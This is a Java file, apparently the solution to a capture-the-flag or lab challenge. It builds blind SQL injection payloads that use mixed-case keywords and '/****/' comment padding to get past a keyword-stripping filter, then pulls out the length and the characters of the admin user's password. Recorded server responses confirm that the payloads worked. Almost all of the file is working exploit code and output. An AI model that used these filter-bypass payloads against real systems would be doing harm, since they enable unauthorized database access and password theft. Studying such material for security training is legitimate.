package answer_1;
public class Answer1 {
    public static void main(String[] args) {

        // length_payload_sql: admin'/****/aNd/****/(sElEcT/****/CaSt((sElEcT/****/lEnGtH(PaSsWoRd)/****/FrOm/****/users/****/WhErE/****/username='admin')/****/As/****/TeXt))='60
        // full_length_payload_sql: SELECT * FROM users WHERE username = 'admin'/****/aNd/****/(sElEcT/****/CaSt((sElEcT/****/lEnGtH(PaSsWoRd)/****/FrOm/****/users/****/WhErE/****/username='admin')/****/As/****/TeXt))='60'
        // ---> Web Server Response: {"exists":true}
        String length_payload_sql = "admin'/****/aNd/****/(sElEcT/****/CaSt((sElEcT/****/lEnGtH(PaSsWoRd)/****/FrOm/****/users/****/WhErE/****/username='admin')/****/As/****/TeXt))='60";
        length_payload_sql = length_payload_sql.replaceAll(" |OR|or|AND|and|LIMIT|limit|OFFSET|offset|WHERE|where|SELECT|select|UPDATE|update|DELETE|delete|DROP|drop|CREATE|create|INSERT|insert|FUNCTION|function|CAST|cast|ASCII|ascii|SUBSTRING|substring|VARCHAR|varchar|/\\*\\*/|;|LENGTH|length|--$", "");
        System.out.println("length_payload_sql: " + length_payload_sql + "\n");
        String full_length_payload_sql = "SELECT * FROM users WHERE username = '" + length_payload_sql + "'";
        System.out.println("full_length_payload_sql: " + full_length_payload_sql + "\n");

        // data_payload_sql: admin'/****/aNd/****/(sElEcT/****/chr((sElEcT/****/aScII(sUbStRiNg(PaSsWoRd,1,1))/****/FrOm/****/users/****/WhErE/****/username='admin')))='$
        // full_data_payload_sql: SELECT * FROM users WHERE username = 'admin'/****/aNd/****/(sElEcT/****/chr((sElEcT/****/aScII(sUbStRiNg(PaSsWoRd,1,1))/****/FrOm/****/users/****/WhErE/****/username='admin')))='$'
        // ---> Web Server Response: {"exists":true}
        String data_payload_sql = "admin'/****/aNd/****/(sElEcT/****/chr((sElEcT/****/aScII(sUbStRiNg(PaSsWoRd,1,1))/****/FrOm/****/users/****/WhErE/****/username='admin')))='$";
        data_payload_sql = data_payload_sql.replaceAll(" |OR|or|AND|and|LIMIT|limit|OFFSET|offset|WHERE|where|SELECT|select|UPDATE|update|DELETE|delete|DROP|drop|CREATE|create|INSERT|insert|FUNCTION|function|CAST|cast|ASCII|ascii|SUBSTRING|substring|VARCHAR|varchar|/\\*\\*/|;|LENGTH|length|--$", "");
        System.out.println("data_payload_sql: " + data_payload_sql + "\n");
        String full_data_payload_sql = "SELECT * FROM users WHERE username = '" + data_payload_sql + "'";
        System.out.println("full_data_payload_sql: " + full_data_payload_sql + "\n");
    }
}
